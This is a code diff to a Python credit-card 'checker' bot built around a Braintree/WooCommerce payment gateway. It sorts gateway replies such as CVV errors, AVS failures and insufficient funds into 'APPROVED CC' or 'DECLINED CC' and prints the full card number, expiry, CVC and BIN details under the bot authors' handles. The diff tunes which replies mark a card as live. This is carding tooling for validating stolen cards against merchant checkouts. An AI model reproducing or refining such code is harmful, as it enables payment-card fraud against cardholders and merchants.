@@ -123,20 +123,19 @@ class BraintreeChecker:
         """Determine if response should be APPROVED or DECLINED based on message"""
         response_lower = response_message.lower()
         
-        # APPROVED scenarios (including CVC issues, AVS, 3D secure, etc.)
+        # APPROVED scenarios (CVC issues, AVS, 3D secure, etc.)
         approved_indicators = [
             'payment method successfully added',
             'payment method added',
             'successfully added',
             'cvv',
-            'Card Issuer Declined CVV (N7)',
             'security code', 
             'cvc',
             'avs',  # AVS rejections often mean card is live but CVC/zip wrong
             '2010',  # Card Issuer Declined CVV
             '2011',  # Voice Authorization Required
             '3d secure',
-            'authentication required',  # Sometimes approved for CCN
+            'authentication required',
             'insufficient funds'  # Sometimes approved for CCN
         ]
         
@@ -158,7 +157,8 @@ class BraintreeChecker:
             'closed card',
             '2108',  # Closed Card code
             '81703',  # Credit card type not accepted
-            'credit card type is not accepted'
+            'credit card type is not accepted',
+            'do not honor'  # Removed from approved list
         ]
         
         for indicator in declined_indicators:
@@ -240,13 +240,16 @@ ERROR ❌
             # Get BIN info
             bin_info = self.get_bin_info(n[:6])
             
+            # Format the response message without DECLINED prefix
+            formatted_response = self.format_response_message(response_message)
+            
             # Format result based on response
             if result == "APPROVED":
                 return f"""
 APPROVED CC ✅
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {formatted_response}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
@@ -257,8 +260,6 @@ APPROVED CC ✅
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
             else:
-                # Format the response message without DECLINED prefix
-                formatted_response = self.format_response_message(response_message)
                 return f"""
 DECLINED CC ❌
 
@@ -430,7 +431,9 @@ ERROR ❌
                 if 'data' not in tokenize_response or 'tokenizeCreditCard' not in tokenize_response['data']:
                     if 'errors' in tokenize_response:
                         error_msg = tokenize_response['errors'][0].get('message', 'Tokenization failed')
-                        return 'DECLINED', f'{error_msg}'
+                        # Determine result based on the actual error message
+                        result = self.determine_result_from_response(error_msg)
+                        return result, f'{error_msg}'
                     return 'DECLINED', 'Tokenization failed - no token in response'
                     
                 tok = tokenize_response['data']['tokenizeCreditCard']['token']
@@ -485,16 +488,8 @@ ERROR ❌
                 
                 if error_match:
                     error_msg = error_match.group(1).strip()
-                    if 'risk_threshold' in error_msg.lower():
-                        return "DECLINED", "RISK_BIN: Retry Later"
-                    elif 'do not honor' in error_msg.lower():
-                        return "DECLINED", "Do Not Honor"
-                    elif 'insufficient funds' in error_msg.lower():
-                        return "DECLINED", "Insufficient Funds"
-                    elif 'invalid' in error_msg.lower():
-                        return "DECLINED", "Invalid Card"
-                    else:
-                        return "DECLINED", f"{error_msg}"
+                    result = self.determine_result_from_response(error_msg)
+                    return result, f'{error_msg}'
                 
                 # Check for generic WooCommerce errors
                 if 'woocommerce-error' in response_text:
